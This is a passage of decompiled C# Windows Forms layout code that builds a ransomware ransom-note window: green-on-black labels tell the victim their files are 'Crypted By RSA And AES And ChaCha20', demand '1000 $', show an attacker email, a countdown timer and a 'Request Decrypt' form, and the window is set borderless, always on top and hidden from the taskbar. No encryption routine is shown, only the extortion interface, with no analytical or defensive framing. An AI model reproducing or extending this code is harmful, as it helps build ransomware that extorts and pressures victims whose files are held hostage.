		((Control)btnRequest).set_Name("btnRequest");
		((Control)btnRequest).set_Size(new Size(217, 73));
		((Control)btnRequest).set_TabIndex(11);
		((Control)btnRequest).set_Text("Request Decrypt");
		((ButtonBase)btnRequest).set_UseVisualStyleBackColor(true);
		((Control)btnRequest).add_Click((EventHandler)btnRequest_Click_1);
		((Control)label13).set_AutoSize(true);
		((Control)label13).set_Font(new Font("Consolas", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label13).set_ForeColor(Color.Lime);
		((Control)label13).set_Location(new Point(12, 105));
		((Control)label13).set_Name("label13");
		((Control)label13).set_Size(new Size(133, 15));
		((Control)label13).set_TabIndex(10);
		((Control)label13).set_Text("Write Your Email :");
		((Control)label11).set_AutoSize(true);
		((Control)label11).set_Font(new Font("Consolas", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label11).set_ForeColor(Color.Lime);
		((Control)label11).set_Location(new Point(12, 41));
		((Control)label11).set_Name("label11");
		((Control)label11).set_Size(new Size(84, 15));
		((Control)label11).set_TabIndex(8);
		((Control)label11).set_Text("My Email==>");
		((Control)groupBox2).get_Controls().Add((Control)(object)lblnotification);
		((Control)groupBox2).get_Controls().Add((Control)(object)lblwal1);
		((Control)groupBox2).get_Controls().Add((Control)(object)btnRequest);
		((Control)groupBox2).get_Controls().Add((Control)(object)label13);
		((Control)groupBox2).get_Controls().Add((Control)(object)label3);
		((Control)groupBox2).get_Controls().Add((Control)(object)lblsec);
		((Control)groupBox2).get_Controls().Add((Control)(object)label15);
		((Control)groupBox2).get_Controls().Add((Control)(object)label11);
		((Control)groupBox2).get_Controls().Add((Control)(object)lblhours);
		((Control)groupBox2).get_Controls().Add((Control)(object)lblmin);
		((Control)groupBox2).get_Controls().Add((Control)(object)label14);
		((Control)groupBox2).get_Controls().Add((Control)(object)label4);
		((Control)groupBox2).get_Controls().Add((Control)(object)txtid2);
		((Control)groupBox2).get_Controls().Add((Control)(object)lblday);
		((Control)groupBox2).get_Controls().Add((Control)(object)txtid1);
		((Control)groupBox2).get_Controls().Add((Control)(object)txtEmail);
		groupBox2.set_FlatStyle((FlatStyle)0);
		((Control)groupBox2).set_Font(new Font("Consolas", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)groupBox2).set_ForeColor(Color.Lime);
		((Control)groupBox2).set_Location(new Point(30, 306));
		((Control)groupBox2).set_Name("groupBox2");
		((Control)groupBox2).set_Size(new Size(869, 320));
		((Control)groupBox2).set_TabIndex(30);
		groupBox2.set_TabStop(false);
		((Control)groupBox2).set_Text("  Step 2: Complete form for get Decryption tools  ");
		((Control)lblwal1).set_AutoSize(true);
		((Control)lblwal1).set_Font(new Font("Consolas", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblwal1).set_ForeColor(Color.Lime);
		((Control)lblwal1).set_Location(new Point(428, 286));
		((Control)lblwal1).set_Name("lblwal1");
		((Control)lblwal1).set_Size(new Size(49, 15));
		((Control)lblwal1).set_TabIndex(7);
		((Control)lblwal1).set_Text("1000 $");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Consolas", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.Lime);
		((Control)label2).set_Location(new Point(27, 140));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(856, 108));
		((Control)label2).set_TabIndex(27);
		((Control)label2).set_Text(componentResourceManager.GetString("label2.Text"));
		((Control)lblwal2).set_AutoSize(true);
		((Control)lblwal2).set_Font(new Font("Consolas", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblwal2).set_ForeColor(Color.Firebrick);
		((Control)lblwal2).set_Location(new Point(382, 16));
		((Control)lblwal2).set_Name("lblwal2");
		((Control)lblwal2).set_Size(new Size(105, 32));
		((Control)lblwal2).set_TabIndex(8);
		((Control)lblwal2).set_Text("1000 $");
		((Control)gpstep).get_Controls().Add((Control)(object)lblwal2);
		gpstep.set_FlatStyle((FlatStyle)0);
		((Control)gpstep).set_Font(new Font("Consolas", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)gpstep).set_ForeColor(Color.Lime);
		((Control)gpstep).set_Location(new Point(30, 249));
		((Control)gpstep).set_Name("gpstep");
		((Control)gpstep).set_Size(new Size(869, 51));
		((Control)gpstep).set_TabIndex(29);
		gpstep.set_TabStop(false);
		((Control)gpstep).set_Text("For Decrypt pay");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Consolas", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(Color.Lime);
		((Control)label5).set_Location(new Point(26, 118));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(740, 22));
		((Control)label5).set_TabIndex(26);
		((Control)label5).set_Text("You Are Crypted By RSA And AES And ChaCha20 Encryption And Not Recovered!");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(7f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.WindowText);
		((Form)this).set_ClientSize(new Size(939, 633));
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)lblattacker);
		((Control)this).get_Controls().Add((Control)(object)groupBox2);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)gpstep);
		((Control)this).set_Font(new Font("Microsoft Sans Serif", 7.8f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)this).set_ForeColor(Color.Black);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_TopMost(true);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)groupBox2).ResumeLayout(false);
		((Control)groupBox2).PerformLayout();
		((Control)gpstep).ResumeLayout(false);
		((Control)gpstep).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
